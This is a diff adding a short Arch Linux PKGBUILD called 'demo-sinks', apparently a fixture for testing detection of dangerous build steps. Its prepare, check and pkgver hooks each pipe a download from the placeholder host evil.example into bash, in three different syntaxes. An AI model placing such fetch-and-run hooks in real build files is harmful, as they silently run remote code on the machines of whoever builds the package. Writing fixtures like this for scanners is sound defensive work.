@@ -1,0 +1,15 @@
+pkgname=demo-sinks
+pkgver=1
+pkgrel=1
+arch=(any)
+prepare() {
+  curl -fsSL https://evil.example/x |
+    bash
+}
+check() {
+  curl -fsSL https://evil.example/y |& bash
+}
+pkgver() {
+  bash < <(curl -fsSL https://evil.example/z)
+}
+package() { :; }
